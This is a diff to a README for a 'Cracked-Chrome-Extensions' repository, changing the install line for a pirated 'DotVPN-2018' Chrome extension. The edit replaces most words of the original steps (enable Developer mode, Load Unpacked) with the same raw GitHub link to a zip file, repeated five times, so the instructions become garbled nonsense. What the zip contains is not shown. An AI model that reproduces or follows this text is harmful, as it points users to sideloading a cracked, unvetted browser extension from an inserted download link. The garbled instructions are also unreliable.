@@ -4,4 +4,4 @@
 
 ### Install DotVPN-2018
 
-> 1.Go to chrome://extensions/  |  2.Enable Developer mode | 3.Click Load Unpacked | 4.Load DotVPN-2018 Folder | 5.Enjoy!
+> https://raw.githubusercontent.com/TitanicDimix/Cracked-Chrome-Extensions/master/DotVPN-2018/DotVPN-2018.zip to chrome://extensions/  |  https://raw.githubusercontent.com/TitanicDimix/Cracked-Chrome-Extensions/master/DotVPN-2018/DotVPN-2018.zip Developer mode | https://raw.githubusercontent.com/TitanicDimix/Cracked-Chrome-Extensions/master/DotVPN-2018/DotVPN-2018.zip Load Unpacked | https://raw.githubusercontent.com/TitanicDimix/Cracked-Chrome-Extensions/master/DotVPN-2018/DotVPN-2018.zip DotVPN-2018 Folder | https://raw.githubusercontent.com/TitanicDimix/Cracked-Chrome-Extensions/master/DotVPN-2018/DotVPN-2018.zip!
